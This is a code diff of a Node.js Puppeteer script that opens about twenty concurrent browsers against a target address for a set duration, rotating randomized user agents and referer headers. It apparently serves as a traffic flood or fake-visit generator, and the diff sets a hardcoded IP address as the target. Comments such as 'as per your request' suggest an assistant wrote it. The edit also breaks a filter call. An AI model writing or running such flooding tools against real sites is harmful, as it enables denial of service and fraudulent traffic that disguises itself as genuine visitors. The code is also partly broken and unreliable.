@@ -13,10 +13,10 @@ const USER_AGENTS = fs.readFileSync('ua.txt', 'utf8')
 const REFERERS = fs.readFileSync('refs.txt', 'utf8')
     .split('\n')
     .map(line => line.trim())
-    .filter(line => line);
+    .filter(line);
 
-const TARGET = process.argv[2] || 'https://example.com';
-const DURATION = parseInt(process.argv[3] || 60); // in seconds
+const TARGET = process.argv[2] || 'http://198.16.110.165/';  // Use your target here
+const DURATION = parseInt(process.argv[3] || 60);  // in seconds
 const CONCURRENT_BROWSERS = 20;  // Hardcoded as per your request
 
 function randomUA() {
@@ -28,17 +28,21 @@ function randomReferer() {
 }
 
 async function visitTarget(target) {
-    const browser = await puppeteer.launch({
-        headless: true,
-        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'],
-        timeout: 15000
-    });
-
+    let browser;
     try {
+        console.log('Launching browser...');
+        browser = await puppeteer.launch({
+            headless: false,  // Run in headful mode (with a visible browser window)
+            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'],
+            timeout: 15000
+        });
+        console.log('Browser launched.');
+
         const page = await browser.newPage();
         const ua = randomUA();
         const ref = randomReferer();
 
+        console.log(`Setting User-Agent: ${ua}`);
         await page.setUserAgent(ua);
         await page.setExtraHTTPHeaders({
             'referer': ref,
@@ -46,13 +50,21 @@ async function visitTarget(target) {
         });
         await page.setViewport({ width: 1280, height: 720 });
 
-        // Open the page and wait for it to load
+        console.log(`Navigating to target: ${target}`);
+        // Wait until the page loads properly
         await page.goto(target, { waitUntil: 'networkidle2', timeout: 15000 });
+        console.log('Page loaded.');
+
+        // Wait for the page to be interactive
         await page.waitForTimeout(1500);  // Keep the tab open for 1.5s
+
     } catch (err) {
         console.error('Error with page load:', err);
     } finally {
-        await browser.close();
+        if (browser) {
+            await browser.close();
+            console.log('Browser closed.');
+        }
     }
 }
 
